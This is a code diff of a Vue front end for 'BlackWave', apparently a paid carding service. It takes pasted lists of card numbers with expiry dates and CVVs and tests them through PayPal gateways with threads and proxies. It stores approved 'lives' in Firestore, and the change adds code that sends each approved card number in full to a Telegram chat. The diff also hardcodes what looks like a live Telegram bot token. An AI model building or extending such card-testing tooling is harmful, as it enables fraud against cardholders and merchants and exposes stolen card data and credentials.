@@ -16,8 +16,7 @@
                         All systems operational
                     </div>
                     <span class="hidden sm:block text-[11px] text-white/20 font-mono">
-                        BLACKWAVE →
-                        <span class="text-white/40">{{ loading ? 'RUNNING' : 'IDLE' }}</span>
+                        BLACKWAVE → <span class="text-white/40">{{ loading ? 'RUNNING' : 'IDLE' }}</span>
                     </span>
                 </div>
                 <div class="flex items-center gap-3">
@@ -29,6 +28,17 @@
                         <span>SPEED <span class="text-amber-400 font-bold">{{ lastSpeed }}</span></span>
                         <span class="text-white/10">|</span>
                         <span>PROGRESS <span class="text-white/60 font-bold">{{ tested }} / {{ loaded }}</span></span>
+                    </div>
+                    <!-- telegram indicator -->
+                    <div v-if="telegramLinked"
+                        class="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold"
+                        style="background:rgba(34,158,217,0.08);border:1px solid rgba(34,158,217,0.2);color:#229ED9">
+                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 2L11 13" />
+                            <path d="M22 2L15 22 11 13 2 9l20-7z" />
+                        </svg>
+                        TG ON
                     </div>
                     <span
                         class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider"
@@ -59,20 +69,17 @@
                 </div>
 
                 <div class="p-5 flex flex-col gap-3">
-                    <!-- Textarea -->
                     <textarea v-model="cardsInput" rows="7"
                         placeholder="Paste your cards here. Format: one per line&#10;e.g. 4174014980983772|02|27|574"
                         class="w-full rounded-xl p-4 font-mono text-[13px] text-white/80 placeholder-white/20 outline-none resize-none transition"
                         style="background:#050508;border:1px solid rgba(255,255,255,0.07);line-height:1.6"
-                        :class="{ 'border-blue-500/40 !important': loading }" />
+                        :class="{ 'border-blue-500/40': loading }" />
 
-                    <!-- Drop zone — clicável e funcional -->
+                    <!-- Drop zone -->
                     <div @click="fileInput.click()" @dragover.prevent="dragOver = true" @dragleave="dragOver = false"
                         @drop.prevent="onDrop"
                         class="rounded-xl border-2 border-dashed flex items-center justify-center gap-3 py-4 cursor-pointer transition-all"
-                        :style="dragOver
-                            ? 'border-color:rgba(59,130,246,0.5);background:rgba(59,130,246,0.05)'
-                            : 'border-color:rgba(255,255,255,0.06);background:transparent'"
+                        :style="dragOver ? 'border-color:rgba(59,130,246,0.5);background:rgba(59,130,246,0.05)' : 'border-color:rgba(255,255,255,0.06)'"
                         :class="{ 'hover:border-white/20 hover:bg-white/[0.015]': !dragOver }">
                         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
@@ -164,52 +171,38 @@
                     </svg>
                     EXECUTION
                 </div>
-
                 <div class="p-5 pt-4">
                     <div class="rounded-xl overflow-hidden border" style="border-color:rgba(255,255,255,0.07)">
-                        <!-- Traffic lights bar -->
                         <div class="flex items-center gap-2 px-4 py-2.5 border-b"
                             style="background:#050508;border-color:rgba(255,255,255,0.07)">
                             <span class="w-2.5 h-2.5 rounded-full" style="background:#ff5f56" />
                             <span class="w-2.5 h-2.5 rounded-full" style="background:#ffbd2e" />
                             <span class="w-2.5 h-2.5 rounded-full" style="background:#27c93f" />
-                            <span class="font-mono text-[11px] text-white/20 ml-2 flex-1 text-center">
-                                BLACKWAVE — {{ loading ? 'RUNNING' : 'IDLE' }}
-                            </span>
+                            <span class="font-mono text-[11px] text-white/20 ml-2 flex-1 text-center">BLACKWAVE — {{
+                                loading ? 'RUNNING' : 'IDLE' }}</span>
                             <div class="flex items-center gap-1.5">
                                 <span class="w-1.5 h-1.5 rounded-full"
                                     :class="loading ? 'bg-emerald-500 animate-pulse' : 'bg-white/20'" />
                                 <span class="font-mono text-[10px]"
-                                    :class="loading ? 'text-emerald-400' : 'text-white/20'">
-                                    {{ loading ? 'RUNNING' : 'READY' }}
-                                </span>
+                                    :class="loading ? 'text-emerald-400' : 'text-white/20'">{{ loading ? 'RUNNING' :
+                                    'READY' }}</span>
                             </div>
                         </div>
-                        <!-- Log output -->
                         <div ref="logContainer"
                             class="font-mono text-[12px] px-4 py-3 h-52 overflow-y-auto flex flex-col gap-[3px]"
                             style="background:#020204">
                             <div v-if="consoleLogs.length === 0" class="text-white/15 py-4 text-center text-[12px]">
-                                Waiting for input...
-                            </div>
+                                Waiting for input...</div>
                             <div v-for="(log, i) in consoleLogs" :key="i"
                                 class="flex items-start gap-3 leading-relaxed">
                                 <span class="text-white/20 shrink-0 text-[10px] pt-0.5 tabular-nums">{{ log.time
                                     }}</span>
-                                <span class="shrink-0 font-bold text-[10px] pt-0.5 tracking-widest" :class="{
-                                    'text-emerald-500': log.type === 'APR',
-                                    'text-red-500': log.type === 'REJ',
-                                    'text-amber-400': log.type === 'ERR',
-                                    'text-blue-400': log.type === 'SYS',
-                                    'text-white/30': log.type === 'RES',
-                                }">[{{ log.type }}]</span>
-                                <span class="break-all" :class="{
-                                    'text-emerald-300/80': log.type === 'APR',
-                                    'text-red-300/60': log.type === 'REJ',
-                                    'text-amber-300/70': log.type === 'ERR',
-                                    'text-blue-300/70': log.type === 'SYS',
-                                    'text-white/40': log.type === 'RES',
-                                }">{{ log.text }}</span>
+                                <span class="shrink-0 font-bold text-[10px] pt-0.5 tracking-widest"
+                                    :class="{ 'text-emerald-500': log.type === 'APR', 'text-red-500': log.type === 'REJ', 'text-amber-400': log.type === 'ERR', 'text-blue-400': log.type === 'SYS', 'text-white/30': log.type === 'RES', 'text-cyan-400': log.type === 'TG' }">
+                                    [{{ log.type }}]</span>
+                                <span class="break-all"
+                                    :class="{ 'text-emerald-300/80': log.type === 'APR', 'text-red-300/60': log.type === 'REJ', 'text-amber-300/70': log.type === 'ERR', 'text-blue-300/70': log.type === 'SYS', 'text-white/40': log.type === 'RES', 'text-cyan-300/70': log.type === 'TG' }">
+                                    {{ log.text }}</span>
                             </div>
                         </div>
                     </div>
@@ -227,37 +220,30 @@
                     </svg>
                     SUMMARY
                 </div>
-
-                <!-- 4 cards sem gap/padding lateral extra — preenchimento total -->
                 <div class="grid grid-cols-2 sm:grid-cols-4" style="border-top:1px solid rgba(255,255,255,0.05)">
                     <div class="summary-card">
                         <div
                             class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none text-white">
                             {{ tested }}</div>
-                        <div class="summary-label text-white/30">
-                            <span class="dot bg-white/30" /> # TOTAL
-                        </div>
+                        <div class="summary-label text-white/30"><span class="dot bg-white/30" /> # TOTAL</div>
                     </div>
                     <div class="summary-card" style="border-left:1px solid rgba(255,255,255,0.05)">
                         <div class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none"
                             style="color:#4ade80">{{ approved.length }}</div>
-                        <div class="summary-label" style="color:rgba(74,222,128,0.6)">
-                            <span class="dot bg-emerald-500" /> APPROVED
-                        </div>
+                        <div class="summary-label" style="color:rgba(74,222,128,0.6)"><span
+                                class="dot bg-emerald-500" /> APPROVED</div>
                     </div>
                     <div class="summary-card" style="border-left:1px solid rgba(255,255,255,0.05)">
                         <div class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none"
                             style="color:#f87171">{{ refused.length }}</div>
-                        <div class="summary-label" style="color:rgba(248,113,113,0.6)">
-                            <span class="dot bg-red-500" /> REJECTED
-                        </div>
+                        <div class="summary-label" style="color:rgba(248,113,113,0.6)"><span class="dot bg-red-500" />
+                            REJECTED</div>
                     </div>
                     <div class="summary-card" style="border-left:1px solid rgba(255,255,255,0.05)">
                         <div class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none"
                             style="color:#fbbf24">{{ errors }}</div>
-                        <div class="summary-label" style="color:rgba(251,191,36,0.6)">
-                            <span class="dot bg-amber-400" /> ERRORS
-                        </div>
+                        <div class="summary-label" style="color:rgba(251,191,36,0.6)"><span class="dot bg-amber-400" />
+                            ERRORS</div>
                     </div>
                 </div>
             </div>
@@ -276,8 +262,6 @@
                     </svg>
                     RESULTS
                 </div>
-
-                <!-- Tabs row -->
                 <div class="flex items-center border-b px-5" style="border-color:rgba(255,255,255,0.07)">
                     <button v-for="tab in resultTabs" :key="tab.key" @click="activeTab = tab.key" class="result-tab"
                         :class="activeTab === tab.key ? tab.activeClass : 'text-white/25 border-transparent hover:text-white/50'">
@@ -289,12 +273,10 @@
                             errors }}
                         </span>
                     </button>
-
-                    <!-- Right actions -->
                     <div class="ml-auto flex items-center gap-1">
                         <button @click="maskToggle" class="results-action-btn" :class="{ 'text-blue-400': masking }">
                             <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                stroke-width="2" stroke-linecap="round">
                                 <rect x="3" y="11" width="18" height="11" rx="2" />
                                 <path d="M7 11V7a5 5 0 0110 0v4" />
                             </svg>
@@ -302,7 +284,7 @@
                         </button>
                         <button @click="hideToggle" class="results-action-btn">
                             <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                stroke-width="2" stroke-linecap="round">
                                 <path v-if="!hideResults"
                                     d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19" />
                                 <line v-if="!hideResults" x1="1" y1="1" x2="23" y2="23" />
@@ -338,16 +320,12 @@
                         </button>
                     </div>
                 </div>
-
-                <!-- Result items — preenchimento total sem padding extra -->
                 <div v-if="!hideResults" class="min-h-[72px] px-5 py-3">
-                    <div v-if="currentList.length === 0" class="py-6 text-center text-[12px] text-white/15 font-mono">
-                        No entries yet.
-                    </div>
+                    <div v-if="currentList.length === 0" class="py-6 text-center text-[12px] text-white/15 font-mono">No
+                        entries yet.</div>
                     <transition-group name="fade-slide" tag="div" class="flex flex-col gap-0.5">
                         <div v-for="(item, idx) in currentList" :key="tab_key(item, idx)"
                             class="flex items-center gap-3 px-3 py-2 rounded-lg font-mono text-[12px] hover:bg-white/[0.02] transition-colors group">
-                            <!-- icon -->
                             <svg class="w-3 h-3 shrink-0"
                                 :class="item.type === 'approved' ? 'text-emerald-500' : item.type === 'error' ? 'text-amber-400' : 'text-red-500'"
                                 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
@@ -358,7 +336,6 @@
                                     <line x1="6" y1="6" x2="18" y2="18" />
                                 </template>
                             </svg>
-                            <!-- text -->
                             <span
                                 :class="item.type === 'approved' ? 'text-emerald-300/80' : item.type === 'error' ? 'text-amber-300/70' : 'text-red-300/60'">
                                 {{ masking ? maskCard(item.card) : item.html }}
@@ -366,9 +343,7 @@
                         </div>
                     </transition-group>
                 </div>
-                <div v-else class="py-6 text-center text-[12px] text-white/15 font-mono">
-                    Results hidden.
-                </div>
+                <div v-else class="py-6 text-center text-[12px] text-white/15 font-mono">Results hidden.</div>
             </div>
 
             <!-- ═══ GENERATOR ════════════════════════════════════ -->
@@ -399,7 +374,7 @@
                 </div>
             </div>
 
-        </div><!-- /max-w container -->
+        </div>
 
         <!-- ═══ MODAL: SETTINGS ══════════════════════════════════ -->
         <transition name="modal-fade">
@@ -409,9 +384,11 @@
                     <div class="relative w-full max-w-xl rounded-3xl border overflow-hidden"
                         style="background:#020208;border-color:rgba(255,255,255,0.1);box-shadow:0 24px 80px rgba(0,0,0,0.7)">
                         <div class="pointer-events-none absolute inset-0"
-                            style="background:radial-gradient(ellipse at 50% 0%, rgba(59,130,246,0.06) 0%, transparent 55%)" />
-
-                        <!-- Header -->
+                            style="background:radial-gradient(ellipse at 50% 0%,rgba(59,130,246,0.06) 0%,transparent 55%)" />
+                        <span class="absolute top-3 left-3 w-3 h-3 border-l border-t border-blue-500/40" />
+                        <span class="absolute top-3 right-3 w-3 h-3 border-r border-t border-blue-500/40" />
+                        <span class="absolute bottom-3 left-3 w-3 h-3 border-l border-b border-blue-500/40" />
+                        <span class="absolute bottom-3 right-3 w-3 h-3 border-r border-b border-blue-500/40" />
                         <div class="relative flex items-center justify-between px-7 py-5 border-b"
                             style="border-color:rgba(255,255,255,0.07)">
                             <div class="flex items-center gap-3">
@@ -437,10 +414,7 @@
                                 </svg>
                             </button>
                         </div>
-
-                        <!-- Body -->
                         <div class="relative px-7 py-6 flex flex-col gap-5">
-
                             <!-- VALIDATION API -->
                             <div>
                                 <div class="settings-section-label mb-3">
@@ -455,16 +429,9 @@
                                     <div v-for="gw in gateways" :key="gw.id"
                                         @click="gw.online && (settings.gateway = gw.name)"
                                         class="flex items-center gap-4 px-4 py-3.5 rounded-2xl border transition-all"
-                                        :class="[
-                                            gw.online ? 'cursor-pointer' : 'opacity-50 cursor-not-allowed',
-                                            settings.gateway === gw.name
-                                                ? 'border-blue-500/30 bg-blue-500/[0.06]'
-                                                : 'border-white/[0.05] bg-white/[0.01] hover:border-white/10'
-                                        ]">
+                                        :class="[gw.online ? 'cursor-pointer' : 'opacity-50 cursor-not-allowed', settings.gateway === gw.name ? 'border-blue-500/30 bg-blue-500/[0.06]' : 'border-white/[0.05] bg-white/[0.01] hover:border-white/10']">
                                         <div class="w-9 h-9 flex items-center justify-center rounded-xl shrink-0 font-display font-extrabold text-[11px]"
-                                            :style="settings.gateway === gw.name
-                                                ? 'background:rgba(59,130,246,0.15);border:1px solid rgba(59,130,246,0.3);color:#60a5fa'
-                                                : 'background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);color:rgba(255,255,255,0.3)'">
+                                            :style="settings.gateway === gw.name ? 'background:rgba(59,130,246,0.15);border:1px solid rgba(59,130,246,0.3);color:#60a5fa' : 'background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);color:rgba(255,255,255,0.3)'">
                                             {{ gw.abbr }}
                                         </div>
                                         <div class="flex-1 min-w-0">
@@ -494,12 +461,11 @@
                                     </div>
                                 </div>
                             </div>
-
                             <!-- THREADS -->
                             <div>
                                 <div class="settings-section-label mb-3">
                                     <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        stroke-width="2" stroke-linecap="round">
                                         <line x1="4" y1="6" x2="20" y2="6" />
                                         <line x1="4" y1="12" x2="14" y2="12" />
                                         <line x1="4" y1="18" x2="18" y2="18" />
@@ -511,7 +477,7 @@
                                     <div class="w-9 h-9 flex items-center justify-center rounded-xl border shrink-0"
                                         style="background:rgba(59,130,246,0.1);border-color:rgba(59,130,246,0.25)">
                                         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#60a5fa"
-                                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                            stroke-width="2" stroke-linecap="round">
                                             <line x1="4" y1="6" x2="20" y2="6" />
                                             <line x1="4" y1="12" x2="14" y2="12" />
                                             <line x1="4" y1="18" x2="18" y2="18" />
@@ -525,9 +491,7 @@
                                         <div class="flex gap-1.5">
                                             <button v-for="n in [1, 2, 4]" :key="n" @click="settings.threads = n"
                                                 class="w-8 h-7 flex items-center justify-center rounded-lg text-[11px] font-bold transition-all"
-                                                :class="settings.threads === n
-                                                    ? 'bg-blue-600 text-white'
-                                                    : 'text-white/30 border border-white/[0.07] hover:border-white/15 hover:text-white/60'">
+                                                :class="settings.threads === n ? 'bg-blue-600 text-white' : 'text-white/30 border border-white/[0.07] hover:border-white/15 hover:text-white/60'">
                                                 ×{{ n }}
                                             </button>
                                         </div>
@@ -556,7 +520,6 @@
                                     </div>
                                 </div>
                             </div>
-
                             <!-- PROXY -->
                             <div>
                                 <label
@@ -566,8 +529,7 @@
                                     style="background:#050508;border:1px solid rgba(255,255,255,0.07)" />
                                 <p class="mt-1.5 text-[11px] text-white/20">Proxy used by gateway requests.</p>
                             </div>
-
-                            <!-- Buttons -->
+                            <!-- BUTTONS -->
                             <div class="flex gap-2.5 pt-1">
                                 <button @click="resetSettings"
                                     class="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl border text-[12px] font-bold text-white/40 hover:text-white hover:bg-white/5 transition"
@@ -603,7 +565,7 @@
                     <div class="relative w-full max-w-sm rounded-3xl border p-8 flex flex-col items-center gap-5 overflow-hidden text-center"
                         style="background:#020208;border-color:rgba(255,255,255,0.1);box-shadow:0 24px 80px rgba(0,0,0,0.7)">
                         <div class="pointer-events-none absolute inset-0"
-                            style="background:radial-gradient(ellipse at 50% 0%, rgba(239,68,68,0.06) 0%, transparent 55%)" />
+                            style="background:radial-gradient(ellipse at 50% 0%,rgba(239,68,68,0.06) 0%,transparent 55%)" />
                         <span class="absolute top-3 left-3 w-3 h-3 border-l border-t border-red-500/30" />
                         <span class="absolute top-3 right-3 w-3 h-3 border-r border-t border-red-500/30" />
                         <span class="absolute bottom-3 left-3 w-3 h-3 border-l border-b border-red-500/30" />
@@ -635,9 +597,8 @@
                         <a href="https://t.me/yuzuuk1" target="_blank" rel="noopener" class="relative w-full">
                             <button @click="showNoBalanceModal = false"
                                 class="w-full flex items-center justify-center gap-2 py-3 rounded-xl text-[13px] font-bold text-white transition-all hover:-translate-y-px"
-                                style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">
-                                Recharge →
-                            </button>
+                                style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">Recharge
+                                →</button>
                         </a>
                     </div>
                 </transition>
@@ -652,7 +613,7 @@
                     <div class="relative w-full max-w-sm rounded-3xl border p-8 flex flex-col items-center gap-5 overflow-hidden text-center"
                         style="background:#020208;border-color:rgba(255,255,255,0.1);box-shadow:0 24px 80px rgba(0,0,0,0.7)">
                         <div class="pointer-events-none absolute inset-0"
-                            style="background:radial-gradient(ellipse at 50% 0%, rgba(239,68,68,0.06) 0%, transparent 55%)" />
+                            style="background:radial-gradient(ellipse at 50% 0%,rgba(239,68,68,0.06) 0%,transparent 55%)" />
                         <span class="absolute top-3 left-3 w-3 h-3 border-l border-t border-red-500/30" />
                         <span class="absolute top-3 right-3 w-3 h-3 border-r border-t border-red-500/30" />
                         <span class="absolute bottom-3 left-3 w-3 h-3 border-l border-b border-red-500/30" />
@@ -683,9 +644,9 @@
                         <a href="https://t.me/yuzuuk1" target="_blank" rel="noopener" class="relative w-full">
                             <button @click="showNoAccessModal = false"
                                 class="w-full flex items-center justify-center gap-2 py-3 rounded-xl text-[13px] font-bold text-white transition-all hover:-translate-y-px"
-                                style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">
-                                Contact @yuzuuk1 →
-                            </button>
+                                style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">Contact
+                                @yuzuuk1
+                                →</button>
                         </a>
                     </div>
                 </transition>
@@ -696,7 +657,7 @@
 </template>
 
 <script setup>
-import { ref, computed, watch, nextTick } from 'vue'
+import { ref, computed, watch, nextTick, onMounted } from 'vue'
 import { doc, updateDoc, getDoc, arrayUnion, serverTimestamp, increment } from 'firebase/firestore'
 import { db, auth } from '~/firebase'
 
@@ -718,6 +679,13 @@ const genBin = ref('')
 const lastSpeed = ref('—')
 const dragOver = ref(false)
 
+/* ── user prefs loaded from Firestore ───────────────────── */
+const telegramLinked = ref(false)
+const telegramChatId = ref('')
+const notifApproved = ref(true)   // enviar TG quando aprovado
+const notifSoundEnable = ref(true)   // tocar som quando aprovado
+const BOT_TOKEN = ref("8893394989:AAHn7cdj2X1DjXyXAyY2L9iE1Np2aoKZ1ZM")     // preenchido via runtimeConfig ou env
+
 /* ── ui state ───────────────────────────────────────────── */
 const showNoBalanceModal = ref(false)
 const showNoAccessModal = ref(false)
@@ -730,21 +698,9 @@ const consoleLogs = ref([])
 
 /* ── tabs ───────────────────────────────────────────────── */
 const resultTabs = [
-    {
-        key: 'approved', label: 'APPROVED', dotClass: 'bg-emerald-500',
-        activeClass: 'text-emerald-400 border-emerald-500',
-        badgeFg: 'background:rgba(34,197,94,0.1);color:#4ade80'
-    },
-    {
-        key: 'rejected', label: 'REJECTED', dotClass: 'bg-red-500',
-        activeClass: 'text-red-400 border-red-500',
-        badgeFg: 'background:rgba(239,68,68,0.1);color:#f87171'
-    },
-    {
-        key: 'errors', label: 'ERRORS', dotClass: 'bg-amber-400',
-        activeClass: 'text-amber-400 border-amber-400',
-        badgeFg: 'background:rgba(251,191,36,0.1);color:#fbbf24'
-    },
+    { key: 'approved', label: 'APPROVED', dotClass: 'bg-emerald-500', activeClass: 'text-emerald-400 border-emerald-500', badgeFg: 'background:rgba(34,197,94,0.1);color:#4ade80' },
+    { key: 'rejected', label: 'REJECTED', dotClass: 'bg-red-500', activeClass: 'text-red-400 border-red-500', badgeFg: 'background:rgba(239,68,68,0.1);color:#f87171' },
+    { key: 'errors', label: 'ERRORS', dotClass: 'bg-amber-400', activeClass: 'text-amber-400 border-amber-400', badgeFg: 'background:rgba(251,191,36,0.1);color:#fbbf24' },
 ]
 
 const currentList = computed(() => {
@@ -752,7 +708,6 @@ const currentList = computed(() => {
     if (activeTab.value === 'rejected') return refused.value.filter(i => i.type === 'refused')
     return refused.value.filter(i => i.type === 'error')
 })
-
 function tab_key(item, idx) { return activeTab.value + idx }
 
 /* ── settings ───────────────────────────────────────────── */
@@ -765,41 +720,64 @@ if (typeof window !== 'undefined') {
 watch(settings, v => localStorage.setItem('bwCheckerSettings', JSON.stringify(v)), { deep: true })
 
 const gateways = [
-    {
-        id: 'us', name: 'PayPal US', abbr: '⚡', gateway: 'PayPal', charge: '———',
-        tags: ['Visa', 'Amex', 'Discover'], online: true
-    },
-    {
-        id: 'ca', name: 'PayPal CA', abbr: '⚡', gateway: 'PayPal', charge: '———',
-        tags: ['Visa', 'Amex', 'Discover'], online: true
-    },
-    {
-        id: 'br', name: 'PayPal BR', abbr: '⚡', gateway: 'PayPal', charge: '———',
-        tags: ['Visa', 'Amex', 'Discover'], online: true
-    },
+    { id: 'us', name: 'PayPal US', abbr: '⚡', gateway: 'PayPal', charge: '———', tags: ['Visa', 'Amex', 'Discover'], online: true },
+    { id: 'ca', name: 'PayPal CA', abbr: '⚡', gateway: 'PayPal', charge: '———', tags: ['Visa', 'Amex', 'Discover'], online: true },
+    { id: 'bra', name: 'PayPal BR', abbr: '⚡', gateway: 'PayPal', charge: '———', tags: ['Visa', 'Amex', 'Discover'], online: true },
 ]
 
 const apiMap = { 'PayPal US': 'us', 'PayPal CA': 'ca', 'PayPal BR': 'bra' }
 
+/* ── load user prefs on mount ───────────────────────────── */
+onMounted(() => {
+    auth.onAuthStateChanged(async u => {
+        if (!u) return
+        try {
+            const snap = await getDoc(doc(db, 'users', u.uid))
+            if (!snap.exists()) return
+            const d = snap.data()
+            telegramChatId.value = d.telegramChatId || ''
+            telegramLinked.value = !!(d.telegramChatId && d.telegramNotif)
+            notifApproved.value = d.notifApproved ?? true
+            notifSoundEnable.value = d.notifSound ?? true
+            // Bot token via Firestore config doc (opcional) ou variável de ambiente do Nuxt
+            // Para usar env: const config = useRuntimeConfig(); BOT_TOKEN.value = config.public.telegramBotToken
+            // Para usar Firestore: buscar doc('config','telegram').token
+        } catch { }
+    })
+})
+
 /* ── helpers ────────────────────────────────────────────── */
-function getTime() {
-    return new Date().toLocaleTimeString('pt-BR', { hour12: false })
-}
+function getTime() { return new Date().toLocaleTimeString('pt-BR', { hour12: false }) }
 function addLog(type, text) {
     consoleLogs.value.push({ type, text, time: getTime() })
-    nextTick(() => {
-        if (logContainer.value) logContainer.value.scrollTop = logContainer.value.scrollHeight
-    })
+    nextTick(() => { if (logContainer.value) logContainer.value.scrollTop = logContainer.value.scrollHeight })
 }
 function playAudio(r) { try { r?.value?.play() } catch { } }
 
 function maskCard(card) {
     if (!card) return ''
     const parts = card.split('|')
-    if (!parts[0]) return card
-    const num = parts[0]
-    const masked = num.slice(0, 4) + '*'.repeat(Math.max(0, num.length - 4))
-    return [masked, ...parts.slice(1).map(() => '**')].join('|')
+    const num = parts[0] || ''
+    const masked = num.slice(0, 4) + 'x'.repeat(Math.max(0, num.length - 4))
+    return [masked, ...parts.slice(1).map(() => 'xx')].join('|')
+}
+
+/* ── Telegram notification ──────────────────────────────── */
+async function sendTelegramNotif(card, gateway, ms) {
+    if (!telegramLinked.value || !notifApproved.value) return
+    if (!telegramChatId.value || !BOT_TOKEN.value) return
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN.value}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramChatId.value,
+                parse_mode: 'HTML',
+                text: `✅ <b>Card Approved!</b>\n\n<code>${card}</code>\n\n🌐 Gateway: <b>${gateway}</b>\n⚡ Speed: <b>${ms}ms</b>\n\n<i>BlackWave.xyz</i>`
+            })
+        })
+        addLog('TG', `Notification sent → ${telegramChatId.value}`)
+    } catch { /* silent fail — não interrompe o checker */ }
 }
 
 /* ── file drop / select ─────────────────────────────────── */
@@ -816,8 +794,7 @@ function onFileSelected(e) {
 function readFile(file) {
     const reader = new FileReader()
     reader.onload = ev => {
-        const text = ev.target?.result || ''
-        const lines = text.split(/\r?\n/).map(l => l.trim()).filter(Boolean)
+        const lines = (ev.target?.result || '').split(/\r?\n/).map(l => l.trim()).filter(Boolean)
         cardsInput.value = lines.join('\n')
         addLog('SYS', `Loaded ${lines.length} lines from "${file.name}".`)
     }
@@ -859,7 +836,8 @@ async function startCheck() {
     const raw = cardsInput.value.trim()
     if (!raw) { errorMessage.value = 'Paste or upload cards first.'; return }
 
-    playAudio(audioSuccess)
+    // ✅ Sound respects user pref
+    if (notifSoundEnable.value) playAudio(audioSuccess)
 
     const user = auth.currentUser
     if (!user) { errorMessage.value = 'You must be logged in.'; return }
@@ -916,14 +894,23 @@ async function startCheck() {
             }
 
             let isApproved = false
-            if (json?.status) { const s = String(json.status).toLowerCase(); if (['aprovada', 'approved', 'sucesso', 'success'].includes(s)) isApproved = true }
+            if (json?.status) {
+                const s = String(json.status).toLowerCase()
+                if (['aprovada', 'approved', 'sucesso', 'success'].includes(s)) isApproved = true
+            }
             if (!isApproved && /(aprovad|approved|sucesso|success)/i.test(text)) isApproved = true
 
             if (isApproved) {
                 const html = compact(json, text, card)
                 approved.value.push({ type: 'approved', card, html })
                 addLog('APR', `${html} (${ms}ms)`)
-                playAudio(audioLive)
+
+                // ✅ Sound respects user pref
+                if (notifSoundEnable.value) playAudio(audioLive)
+
+                // ✅ Telegram notification
+                sendTelegramNotif(card, settings.value.gateway, ms)
+
                 balance = Math.max(0, balance - 0.10)
                 checksMonth++; livesUsed++; avgSpentWeek = Math.max(0, avgSpentWeek + 0.10)
                 updateDoc(userRef, { lives: arrayUnion(card), checksMonth, livesUsed, lastCheck: serverTimestamp(), balance, avgSpentWeek }).catch(() => { })
@@ -932,7 +919,7 @@ async function startCheck() {
                 refused.value.push({ type: 'refused', card, html })
                 addLog('REJ', `${html} (${ms}ms)`)
             }
-        } catch (e) {
+        } catch {
             errors.value++
             refused.value.push({ type: 'error', card, html: `${card} → ERROR` })
             addLog('ERR', `${card} → ERROR`)
@@ -963,7 +950,6 @@ function resetAll() {
     consoleLogs.value = []; lastSpeed.value = '—'
 }
 
-/* ── result actions ─────────────────────────────────────── */
 function maskToggle() { masking.value = !masking.value }
 function hideToggle() { hideResults.value = !hideResults.value }
 function clearResults() {
@@ -971,16 +957,11 @@ function clearResults() {
     else if (activeTab.value === 'rejected') refused.value = refused.value.filter(i => i.type !== 'refused')
     else refused.value = refused.value.filter(i => i.type !== 'error')
 }
-function copyResults() {
-    navigator.clipboard.writeText(currentList.value.map(i => i.card).join('\n'))
-}
+function copyResults() { navigator.clipboard.writeText(currentList.value.map(i => i.card).join('\n')) }
 function exportResults() {
     const blob = new Blob([currentList.value.map(i => i.card).join('\n')], { type: 'text/plain' })
-    const a = Object.assign(document.createElement('a'), { href: URL.createObjectURL(blob), download: `${activeTab.value}.txt` })
-    a.click()
+    Object.assign(document.createElement('a'), { href: URL.createObjectURL(blob), download: `${activeTab.value}.txt` }).click()
 }
-
-/* ── settings ───────────────────────────────────────────── */
 function resetSettings() { settings.value = { threads: 1, gateway: 'PayPal US', proxy: '' }; localStorage.removeItem('bwCheckerSettings') }
 function saveSettings() { showConfig.value = false }
 </script>
@@ -989,23 +970,22 @@ function saveSettings() { showConfig.value = false }
 @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&display=swap');
 
 .font-display {
-    font-family: 'Syne', sans-serif;
+    font-family: 'Syne', sans-serif
 }
 
 .font-sans {
-    font-family: 'DM Sans', sans-serif;
+    font-family: 'DM Sans', sans-serif
 }
 
 .font-mono {
-    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace
 }
 
-/* ── Section block ───────────────────────────────────────── */
 .section-block {
     border: 1px solid rgba(255, 255, 255, 0.07);
     border-radius: 16px;
     overflow: hidden;
-    background: #030305;
+    background: #030305
 }
 
 .section-header {
@@ -1015,19 +995,18 @@ function saveSettings() { showConfig.value = false }
     padding: 10px 20px;
     font-size: 10px;
     font-weight: 700;
-    letter-spacing: 0.13em;
+    letter-spacing: .13em;
     text-transform: uppercase;
-    color: rgba(255, 255, 255, 0.25);
-    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-    background: rgba(255, 255, 255, 0.01);
+    color: rgba(255, 255, 255, .25);
+    border-bottom: 1px solid rgba(255, 255, 255, .05);
+    background: rgba(255, 255, 255, .01)
 }
 
